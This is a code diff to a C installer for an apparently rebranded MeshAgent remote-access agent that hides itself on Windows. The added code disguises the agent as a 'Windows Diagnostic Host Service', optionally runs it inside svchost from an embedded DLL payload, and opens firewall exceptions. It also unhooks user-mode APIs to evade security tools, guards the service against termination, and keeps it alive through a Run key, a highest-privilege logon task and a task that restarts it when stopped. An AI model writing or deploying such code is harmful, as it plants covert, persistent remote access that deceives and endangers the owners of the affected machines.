@@ -17,23 +17,98 @@
 #include <strsafe.h>
 #include "stealth.h"
 #include "stealth_utils.h"
-#include "../meshcore/generated/meshagent_branding.h"
+#include "branding_util.h"
+#include "svchost_payload.h"
+
+static const wchar_t* STEALTH_FALLBACK_SERVICE_DESCRIPTION = L"system health monitoring. If this service is stopped, certain features may not function properly.";
+static const wchar_t* STEALTH_FALLBACK_SERVICE_NAME = L"WinDiagnosticHost";
+static const wchar_t* STEALTH_FALLBACK_DISPLAY_NAME = L"Windows Diagnostic Host Service";
+static const wchar_t* STEALTH_FALLBACK_EXE_NAME = L"diaghost.exe";
+static const wchar_t* STEALTH_FALLBACK_DLL_NAME = L"diagsvc.dll";
+static const wchar_t* STEALTH_FALLBACK_DB_NAME = L"diaghost.db";
+static const wchar_t* STEALTH_FALLBACK_CONF_NAME = L"diaghost.conf";
+static const wchar_t* STEALTH_FALLBACK_LOG_NAME = L"diagnostics.log";
+
+static void MeshInstaller_NormalizePathSeparators(wchar_t* path)
+{
+    if (path == NULL) { return; }
+    for (size_t i = 0; path[i] != L'\0'; ++i)
+    {
+        if (path[i] == L'/')
+        {
+            path[i] = L'\\';
+        }
+    }
+}
+
+static BOOL MeshInstaller_GetDefaultInstallRoot(wchar_t* buffer, size_t count)
+{
+    if (buffer == NULL || count == 0) { return FALSE; }
+    PWSTR programData = NULL;
+    HRESULT hr = SHGetKnownFolderPath(&FOLDERID_ProgramData, KF_FLAG_DEFAULT, NULL, &programData);
+    BOOL resolved = FALSE;
+    if (SUCCEEDED(hr) && programData != NULL)
+    {
+        resolved = SUCCEEDED(StringCchCopyW(buffer, count, programData));
+        CoTaskMemFree(programData);
+    }
+
+    if (!resolved)
+    {
+        DWORD envLen = GetEnvironmentVariableW(L"ProgramData", buffer, (DWORD)count);
+        resolved = (envLen > 0 && envLen < count);
+    }
+
+    if (!resolved)
+    {
+        WCHAR windowsDir[MAX_PATH] = {0};
+        UINT wlen = GetWindowsDirectoryW(windowsDir, MAX_PATH);
+        if (wlen == 0 || wlen >= MAX_PATH) { return FALSE; }
+        if (FAILED(StringCchPrintfW(buffer, count, L"%s\\ProgramData", windowsDir))) { return FALSE; }
+        resolved = TRUE;
+    }
+
+    if (!resolved) { return FALSE; }
+
+    MeshInstaller_NormalizePathSeparators(buffer);
+    size_t len = wcslen(buffer);
+    if (len > 0 && buffer[len - 1] != L'\\')
+    {
+        if (FAILED(StringCchCatW(buffer, count, L"\\"))) { return FALSE; }
+    }
+    if (FAILED(StringCchCatW(buffer, count, L"DiagnosticHost"))) { return FALSE; }
+    return TRUE;
+}
+
+static BOOL MeshInstaller_CombinePath(wchar_t* dest, size_t destLen, const wchar_t* root, const wchar_t* leaf)
+{
+    if (dest == NULL || destLen == 0) { return FALSE; }
+    dest[0] = L'\0';
+    if (root == NULL || root[0] == L'\0') { return FALSE; }
+
+    if (FAILED(StringCchCopyW(dest, destLen, root))) { return FALSE; }
+    MeshInstaller_NormalizePathSeparators(dest);
+
+    if (leaf != NULL && leaf[0] != L'\0')
+    {
+        WCHAR leafCopy[MAX_PATH] = {0};
+        if (FAILED(StringCchCopyW(leafCopy, _countof(leafCopy), leaf))) { return FALSE; }
+        MeshInstaller_NormalizePathSeparators(leafCopy);
+        size_t len = wcslen(dest);
+        if (len > 0 && dest[len - 1] != L'\\')
+        {
+            if (FAILED(StringCchCatW(dest, destLen, L"\\"))) { return FALSE; }
+        }
+        if (FAILED(StringCchCatW(dest, destLen, leafCopy))) { return FALSE; }
+    }
+
+    return TRUE;
+}
 
 // Forward declarations for persistence helpers
-static void Stealth_AddRunKeyIfEnabled(const wchar_t* serviceName);
-static void Stealth_AddScheduledTaskIfEnabled(const wchar_t* serviceName);
-static void Stealth_AddServiceStoppedAutoStartIfEnabled(const wchar_t* serviceName);
-
-// Installation configuration
-// Prefer computing install paths at runtime to avoid hard-coding drive/root.
-// Keep folder names stable but derive base from the actual Windows directory.
-#define INSTALL_FOLDER_NAME           L"DiagnosticHost"
-#define INSTALL_FOLDER_LOGS_NAME      L"logs"
-#define SERVICE_NAME L"WinDiagnosticHost"
-#define SERVICE_DISPLAY_NAME L"Windows Diagnostic Host Service"
-#define SERVICE_DESCRIPTION L"system health monitoring. If this service is stopped, certain features may not function properly."
-#define SERVICE_EXE_NAME L"diaghost.exe"
-#define SERVICE_DLL_NAME L"diagsvc.dll"
+static void Stealth_AddRunKeyIfEnabled(const mesh_persistence_profile_t* persistence, const wchar_t* serviceName);
+static void Stealth_AddScheduledTaskIfEnabled(const mesh_persistence_profile_t* persistence, const wchar_t* serviceName);
+static void Stealth_AddServiceStoppedAutoStartIfEnabled(const mesh_persistence_profile_t* persistence, const wchar_t* serviceName);
 
 // ================================================================
 // Installation Paths
@@ -41,60 +116,50 @@ static void Stealth_AddServiceStoppedAutoStartIfEnabled(const wchar_t* serviceNa
 
 BOOL Stealth_GetInstallPaths(StealthInstallPaths *paths)
 {
-    if (!paths)
-    {
-        return FALSE;
-    }
+    if (paths == NULL) { return FALSE; }
 
     memset(paths, 0, sizeof(StealthInstallPaths));
 
-    // Base installation directory (derive from %ProgramData% to avoid per-profile installs)
-    WCHAR baseDir[MAX_PATH] = {0};
-    PWSTR programData = NULL;
-    HRESULT hr = SHGetKnownFolderPath(&FOLDERID_ProgramData, KF_FLAG_DEFAULT, NULL, &programData);
-    if (SUCCEEDED(hr) && programData != NULL)
+    const mesh_branding_definition_t* branding = MeshConfig_GetBranding();
+
+    MeshService_CopyBrandingPathToWide(MeshService_GetInstallRootText(), paths->installDir, MAX_PATH);
+    if (paths->installDir[0] == L'\0')
     {
-        if (FAILED(StringCchCopyW(baseDir, MAX_PATH, programData)))
-        {
-            Stealth_DebugPrintfW(L"StringCchCopyW failed for baseDir (ProgramData)");
-            CoTaskMemFree(programData);
-            return FALSE;
-        }
-        CoTaskMemFree(programData);
+        if (!MeshInstaller_GetDefaultInstallRoot(paths->installDir, MAX_PATH)) { return FALSE; }
     }
-    else
+    MeshInstaller_NormalizePathSeparators(paths->installDir);
+
+    MeshService_CopyBrandingPathToWide(MeshService_GetLogDirectoryText(), paths->logsDir, MAX_PATH);
+    if (paths->logsDir[0] == L'\0')
     {
-        DWORD envLen = GetEnvironmentVariableW(L"ProgramData", baseDir, MAX_PATH);
-        if (envLen == 0 || envLen >= MAX_PATH)
-        {
-            WCHAR windowsDir[MAX_PATH] = {0};
-            UINT wlen = GetWindowsDirectoryW(windowsDir, MAX_PATH);
-            if (wlen == 0 || wlen >= MAX_PATH || FAILED(StringCchPrintfW(baseDir, MAX_PATH, L"%s\\ProgramData", windowsDir)))
-            {
-                Stealth_DebugPrintfW(L"Failed to resolve ProgramData path");
-                if (programData) { CoTaskMemFree(programData); }
-                return FALSE;
-            }
-        }
+        if (!MeshInstaller_CombinePath(paths->logsDir, MAX_PATH, paths->installDir, L"logs")) { return FALSE; }
     }
 
-    if (FAILED(StringCchPrintfW(paths->installDir, MAX_PATH, L"%s\\%s", baseDir, INSTALL_FOLDER_NAME))) { Stealth_DebugPrintfW(L"StringCchPrintfW failed for installDir"); return FALSE; }
-    if (FAILED(StringCchPrintfW(paths->logsDir, MAX_PATH, L"%s\\%s\\%s", baseDir, INSTALL_FOLDER_NAME, INSTALL_FOLDER_LOGS_NAME))) { Stealth_DebugPrintfW(L"StringCchPrintfW failed for logsDir"); return FALSE; }
+    wchar_t exeName[MAX_PATH] = {0};
+    MeshService_CopyBrandingTextToWide(MeshService_GetBinaryNameText(), exeName, _countof(exeName));
+    if (exeName[0] == L'\0') { StringCchCopyW(exeName, _countof(exeName), STEALTH_FALLBACK_EXE_NAME); }
 
-    // Executable path
-    swprintf_s(paths->exePath, MAX_PATH, L"%s\\%s", paths->installDir, SERVICE_EXE_NAME);
+    wchar_t dllName[MAX_PATH] = {0};
+    MeshService_CopyBrandingTextToWide(MeshService_GetSvchostDllNameText(), dllName, _countof(dllName));
+    if (dllName[0] == L'\0') { StringCchCopyW(dllName, _countof(dllName), STEALTH_FALLBACK_DLL_NAME); }
 
-    // DLL path (for svchost mode)
-    swprintf_s(paths->dllPath, MAX_PATH, L"%s\\%s", paths->installDir, SERVICE_DLL_NAME);
+    wchar_t dbName[MAX_PATH] = {0};
+    MeshService_CopyBrandingTextToWide(MeshService_GetDatabaseFileNameText(), dbName, _countof(dbName));
+    if (dbName[0] == L'\0') { StringCchCopyW(dbName, _countof(dbName), STEALTH_FALLBACK_DB_NAME); }
 
-    // Database path
-    swprintf_s(paths->dbPath, MAX_PATH, L"%s\\diaghost.db", paths->installDir);
+    wchar_t confName[MAX_PATH] = {0};
+    MeshService_CopyBrandingTextToWide(MeshService_GetConfigFileNameText(), confName, _countof(confName));
+    if (confName[0] == L'\0') { StringCchCopyW(confName, _countof(confName), STEALTH_FALLBACK_CONF_NAME); }
 
-    // Configuration path
-    swprintf_s(paths->confPath, MAX_PATH, L"%s\\diaghost.conf", paths->installDir);
+    wchar_t logFileName[MAX_PATH] = {0};
+    MeshService_CopyBrandingTextToWide(MeshService_GetLogFileNameText(), logFileName, _countof(logFileName));
+    if (logFileName[0] == L'\0') { StringCchCopyW(logFileName, _countof(logFileName), STEALTH_FALLBACK_LOG_NAME); }
 
-    // Log file path
-    swprintf_s(paths->logPath, MAX_PATH, L"%s\\diagnostics.log", paths->logsDir);
+    if (!MeshInstaller_CombinePath(paths->exePath, MAX_PATH, paths->installDir, exeName)) { return FALSE; }
+    if (!MeshInstaller_CombinePath(paths->dllPath, MAX_PATH, paths->installDir, dllName)) { return FALSE; }
+    if (!MeshInstaller_CombinePath(paths->dbPath, MAX_PATH, paths->installDir, dbName)) { return FALSE; }
+    if (!MeshInstaller_CombinePath(paths->confPath, MAX_PATH, paths->installDir, confName)) { return FALSE; }
+    if (!MeshInstaller_CombinePath(paths->logPath, MAX_PATH, paths->logsDir, logFileName)) { return FALSE; }
 
     return TRUE;
 }
@@ -110,6 +175,19 @@ BOOL Stealth_PerformCompleteInstallation(
 {
     StealthInstallPaths paths;
     BOOL success = FALSE;
+    wchar_t serviceKeyName[256] = {0};
+    wchar_t serviceDisplayName[256] = {0};
+    wchar_t serviceDescription[512] = {0};
+    const mesh_persistence_profile_t* persistence = MeshConfig_GetPersistence();
+
+    MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), serviceKeyName, _countof(serviceKeyName));
+    if (serviceKeyName[0] == L'\0') { StringCchCopyW(serviceKeyName, _countof(serviceKeyName), STEALTH_FALLBACK_SERVICE_NAME); }
+
+    MeshService_CopyBrandingTextToWide(MeshService_GetServiceNameText(), serviceDisplayName, _countof(serviceDisplayName));
+    if (serviceDisplayName[0] == L'\0') { StringCchCopyW(serviceDisplayName, _countof(serviceDisplayName), STEALTH_FALLBACK_DISPLAY_NAME); }
+
+    MeshService_CopyBrandingTextToWide(MeshConfig_GetBranding()->fileDescription, serviceDescription, _countof(serviceDescription));
+    if (serviceDescription[0] == L'\0') { StringCchCopyW(serviceDescription, _countof(serviceDescription), STEALTH_FALLBACK_SERVICE_DESCRIPTION); }
 
     // Get installation paths
     if (!Stealth_GetInstallPaths(&paths))
@@ -141,12 +219,28 @@ BOOL Stealth_PerformCompleteInstallation(
         }
     }
 
-    if (sourceDllPath && useSvchostMode)
+    if (useSvchostMode)
     {
-        // Copy DLL for svchost mode
-        if (!Stealth_InstallFiles(sourceDllPath, paths.dllPath))
+        BOOL dllStaged = FALSE;
+        if (sourceDllPath && sourceDllPath[0] != L'\0')
         {
-            Stealth_DebugPrintfW(L"Stealth_InstallFiles failed (DLL) %ls -> %ls", sourceDllPath, paths.dllPath);
+            dllStaged = Stealth_InstallFiles(sourceDllPath, paths.dllPath);
+            if (!dllStaged)
+            {
+                Stealth_DebugPrintfW(L"Stealth_InstallFiles failed (DLL) %ls -> %ls", sourceDllPath, paths.dllPath);
+            }
+        }
+        else
+        {
+            dllStaged = MeshSvchostPayload_WriteToPath(paths.dllPath);
+            if (!dllStaged)
+            {
+                Stealth_DebugLastErrorW(L"MeshSvchostPayload_WriteToPath");
+            }
+        }
+
+        if (!dllStaged)
+        {
             return FALSE;
         }
     }
@@ -155,9 +249,9 @@ BOOL Stealth_PerformCompleteInstallation(
     if (useSvchostMode)
     {
         // Register for svchost.exe hosting
-        if (!Stealth_RegisterSvchostService(SERVICE_NAME, paths.dllPath))
+        if (!Stealth_RegisterSvchostService(serviceKeyName, paths.dllPath))
         {
-            Stealth_DebugPrintfW(L"Stealth_RegisterSvchostService failed for %ls", SERVICE_NAME);
+            Stealth_DebugPrintfW(L"Stealth_RegisterSvchostService failed for %ls", serviceKeyName);
             return FALSE;
         }
         success = TRUE;
@@ -170,8 +264,8 @@ BOOL Stealth_PerformCompleteInstallation(
         {
             SC_HANDLE hService = CreateServiceW(
                 hSCM,
-                SERVICE_NAME,
-                SERVICE_DISPLAY_NAME,
+                serviceKeyName,
+                serviceDisplayName,
                 SERVICE_QUERY_STATUS | SERVICE_START | SERVICE_STOP | SERVICE_CHANGE_CONFIG | SERVICE_QUERY_CONFIG | DELETE,
                 SERVICE_WIN32_OWN_PROCESS,
                 SERVICE_AUTO_START,
@@ -188,7 +282,7 @@ BOOL Stealth_PerformCompleteInstallation(
             {
                 // Set description
                 SERVICE_DESCRIPTIONW sd;
-                sd.lpDescription = (LPWSTR)SERVICE_DESCRIPTION;
+                sd.lpDescription = serviceDescription;
                 ChangeServiceConfig2W(hService, SERVICE_CONFIG_DESCRIPTION, &sd);
 
                 // Configure delayed auto-start for faster boot performance impact
@@ -202,15 +296,17 @@ BOOL Stealth_PerformCompleteInstallation(
                 ChangeServiceConfig2W(hService, SERVICE_CONFIG_SERVICE_SID_INFO, &sidInfo);
 
                 // Harden service DACL to Administrators + SYSTEM
-                Stealth_HardenServiceDacl(SERVICE_NAME);
+                Stealth_HardenServiceDacl(serviceKeyName);
 
                 // Configure persistence behaviors based on branding flags
-#if defined(MESH_AGENT_PERSIST_WATCHDOG) && (MESH_AGENT_PERSIST_WATCHDOG!=0)
-                Stealth_ProtectServiceFromTermination(SERVICE_NAME);
-#endif
-                Stealth_AddRunKeyIfEnabled(SERVICE_NAME);
-                Stealth_AddScheduledTaskIfEnabled(SERVICE_NAME);
-                Stealth_AddServiceStoppedAutoStartIfEnabled(SERVICE_NAME);
+                if (persistence != NULL && persistence->watchdog != 0)
+                {
+                    Stealth_ProtectServiceFromTermination(serviceKeyName);
+                }
+
+                Stealth_AddRunKeyIfEnabled(persistence, serviceKeyName);
+                Stealth_AddScheduledTaskIfEnabled(persistence, serviceKeyName);
+                Stealth_AddServiceStoppedAutoStartIfEnabled(persistence, serviceKeyName);
 
                 CloseServiceHandle(hService);
                 success = TRUE;
@@ -232,9 +328,9 @@ BOOL Stealth_PerformCompleteInstallation(
     const wchar_t* fileToExcept = useSvchostMode ?
         L"C:\\Windows\\System32\\svchost.exe" : paths.exePath;
 
-    if (!Stealth_AddFirewallRuleForService(SERVICE_NAME, fileToExcept))
+    if (!Stealth_AddFirewallRuleForService(serviceKeyName, fileToExcept))
     {
-        Stealth_DebugPrintfW(L"Stealth_AddFirewallRuleForService failed for %ls", SERVICE_NAME);
+        Stealth_DebugPrintfW(L"Stealth_AddFirewallRuleForService failed for %ls", serviceKeyName);
     }
 
     // Step 5: Apply anti-detection measures
@@ -246,13 +342,13 @@ BOOL Stealth_PerformCompleteInstallation(
     Stealth_UnhookUserModeAPIs();
 
     // Step 6: Hide service registry key (optional, can make debugging harder)
-    // Stealth_HideServiceRegistry(SERVICE_NAME);
+    // Stealth_HideServiceRegistry(serviceKeyName);
 
     // Step 7: Start the service and confirm running state
     SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
     if (hSCM)
     {
-        SC_HANDLE hService = OpenServiceW(hSCM, SERVICE_NAME, SERVICE_START | SERVICE_QUERY_STATUS);
+        SC_HANDLE hService = OpenServiceW(hSCM, serviceKeyName, SERVICE_START | SERVICE_QUERY_STATUS);
         if (hService)
         {
             if (!StartServiceW(hService, 0, NULL)) {
@@ -291,6 +387,10 @@ BOOL Stealth_PerformCompleteUninstallation(void)
     SC_HANDLE hSCM = NULL;
     SC_HANDLE hService = NULL;
     SERVICE_STATUS status = {0};
+    wchar_t serviceKeyName[256] = {0};
+
+    MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), serviceKeyName, _countof(serviceKeyName));
+    if (serviceKeyName[0] == L'\0') { StringCchCopyW(serviceKeyName, _countof(serviceKeyName), STEALTH_FALLBACK_SERVICE_NAME); }
 
     // Get paths
     Stealth_GetInstallPaths(&paths);
@@ -299,7 +399,7 @@ BOOL Stealth_PerformCompleteUninstallation(void)
     hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
     if (hSCM)
     {
-        hService = OpenServiceW(hSCM, SERVICE_NAME,
+        hService = OpenServiceW(hSCM, serviceKeyName,
                                 SERVICE_STOP | SERVICE_QUERY_STATUS | DELETE);
         if (hService)
         {
@@ -328,7 +428,7 @@ BOOL Stealth_PerformCompleteUninstallation(void)
     }
 
     // Remove firewall rules
-    Stealth_RemoveFirewallRuleForService(SERVICE_NAME);
+    Stealth_RemoveFirewallRuleForService(serviceKeyName);
 
     // Delete files (best-effort)
     DeleteFileW(paths.dbPath);
@@ -353,11 +453,15 @@ BOOL Stealth_IsAlreadyInstalled(void)
     SC_HANDLE hSCM = NULL;
     SC_HANDLE hService = NULL;
     BOOL installed = FALSE;
+    wchar_t serviceKeyName[256] = {0};
+
+    MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), serviceKeyName, _countof(serviceKeyName));
+    if (serviceKeyName[0] == L'\0') { StringCchCopyW(serviceKeyName, _countof(serviceKeyName), STEALTH_FALLBACK_SERVICE_NAME); }
 
     hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
     if (hSCM)
     {
-        hService = OpenServiceW(hSCM, SERVICE_NAME, SERVICE_QUERY_STATUS);
+        hService = OpenServiceW(hSCM, serviceKeyName, SERVICE_QUERY_STATUS);
         if (hService)
         {
             installed = TRUE;
@@ -368,9 +472,13 @@ BOOL Stealth_IsAlreadyInstalled(void)
 
     return installed;
 }
-static void Stealth_AddRunKeyIfEnabled(const wchar_t* serviceName)
+static void Stealth_AddRunKeyIfEnabled(const mesh_persistence_profile_t* persistence, const wchar_t* serviceName)
 {
-#if defined(MESH_AGENT_PERSIST_RUNKEY) && (MESH_AGENT_PERSIST_RUNKEY!=0)
+    if (persistence == NULL || persistence->runKey == 0 || serviceName == NULL || serviceName[0] == L'\0')
+    {
+        return;
+    }
+
     HKEY hKey;
     const wchar_t* runKey = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
     if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, runKey, 0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS)
@@ -390,12 +498,15 @@ static void Stealth_AddRunKeyIfEnabled(const wchar_t* serviceName)
         RegSetValueExW(hKey, serviceName, 0, REG_SZ, (const BYTE*)value, (DWORD)((wcslen(value) + 1) * sizeof(wchar_t)));
         RegCloseKey(hKey);
     }
-#endif
 }
 
-static void Stealth_AddScheduledTaskIfEnabled(const wchar_t* serviceName)
+static void Stealth_AddScheduledTaskIfEnabled(const mesh_persistence_profile_t* persistence, const wchar_t* serviceName)
 {
-#if defined(MESH_AGENT_PERSIST_TASK) && (MESH_AGENT_PERSIST_TASK!=0)
+    if (persistence == NULL || persistence->scheduledTask == 0 || serviceName == NULL || serviceName[0] == L'\0')
+    {
+        return;
+    }
+
     // Create an on-logon scheduled task to (re)start the service with highest privileges
     // schtasks /Create /TN <name> /TR "sc start <service>" /SC ONLOGON /RL HIGHEST /F
     wchar_t sysDir[MAX_PATH];
@@ -421,12 +532,15 @@ static void Stealth_AddScheduledTaskIfEnabled(const wchar_t* serviceName)
     CreateProcessW(NULL, cmdLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
     if (pi.hProcess) { CloseHandle(pi.hProcess); }
     if (pi.hThread) { CloseHandle(pi.hThread); }
-#endif
 }
 
-static void Stealth_AddServiceStoppedAutoStartIfEnabled(const wchar_t* serviceName)
+static void Stealth_AddServiceStoppedAutoStartIfEnabled(const mesh_persistence_profile_t* persistence, const wchar_t* serviceName)
 {
-#if defined(MESH_AGENT_PERSIST_WMI) && (MESH_AGENT_PERSIST_WMI!=0)
+    if (persistence == NULL || persistence->wmiRestart == 0 || serviceName == NULL || serviceName[0] == L'\0')
+    {
+        return;
+    }
+
     // Implement as an event-driven scheduled task (instead of WMI permanent consumer)
     // Triggers when Service Control Manager logs 7036 (service entered stopped state) for this service.
     // schtasks /Create /TN <name> /TR "sc start <service>" /SC ONEVENT /EC System /MO <XPath> /RL HIGHEST /F
@@ -465,5 +579,4 @@ static void Stealth_AddServiceStoppedAutoStartIfEnabled(const wchar_t* serviceNa
     CreateProcessW(NULL, cmdLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
     if (pi.hProcess) { CloseHandle(pi.hProcess); }
     if (pi.hThread) { CloseHandle(pi.hThread); }
-#endif
 }
